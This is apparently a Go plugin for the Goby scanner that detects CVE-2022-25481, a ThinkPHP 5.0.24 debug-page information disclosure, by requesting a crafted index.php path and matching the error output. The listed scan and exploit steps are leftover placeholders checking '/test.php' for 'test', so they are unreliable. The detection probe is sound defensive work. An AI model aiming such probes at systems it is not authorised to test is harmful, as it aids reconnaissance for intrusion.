package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
  "Name": "ThinkPHP 5.0.24 - Information Disclosure",
  "Description": "<p><span style=\"font-size: 14px;\">ThinkPHP Framework v5.0.24被发现配置时没有PATHINFO参数。</span><span style=\"font-size: 14px;\">这允许攻击者从index.php访问所有系统环境参数。</span><br></p>",
  "Product": "",
  "Homepage": "",
  "DisclosureDate": "2022-12-06",
  "Author": "",
  "FofaQuery": "app=\"ThinkPHP\"",
  "GobyQuery": "app=\"ThinkPHP\"",
  "Level": "2",
  "Impact": "",
  "Recommendation": "",
  "References": [
    "https://github.com/Lyther/VulnDiscover/blob/master/Web/ThinkPHP_InfoLeak.md",
    "https://nvd.nist.gov/vuln/detail/CVE-2022-25481"
  ],
  "Is0day": false,
  "HasExp": false,
  "ExpParams": [],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/test.php",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "test",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/test.php",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "test",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "Tags": [],
  "VulType": [],
  "CVEIDs": [
    "CVE-2022-25481"
  ],
  "CNNVD": [
    ""
  ],
  "CNVD": [
    ""
  ],
  "CVSSScore": "",
  "Translation": {
    "CN": {
      "Name": "ThinkPHP 5.0.24 - Information Disclosure",
      "Product": "",
      "Description": "<p><span style=\"font-size: 14px;\">ThinkPHP Framework v5.0.24被发现配置时没有PATHINFO参数。</span><span style=\"font-size: 14px;\">这允许攻击者从index.php访问所有系统环境参数。</span><br></p>",
      "Recommendation": "",
      "Impact": "",
      "VulType": [],
      "Tags": []
    },
    "EN": {
      "Name": "ThinkPHP 5.0.24 - Information Disclosure",
      "Product": "",
      "Description": "",
      "Recommendation": "",
      "Impact": "",
      "VulType": [],
      "Tags": []
    }
  },
  "AttackSurfaces": {
    "Application": null,
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/index.php?s=example"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 404 && strings.Contains(resp.RawBody, "ThinkPHP") && (strings.Contains(resp.RawBody, "HttpException") || strings.Contains(resp.RawBody, "TRACE"))
			}
			return false
		},
		nil,
	))
}
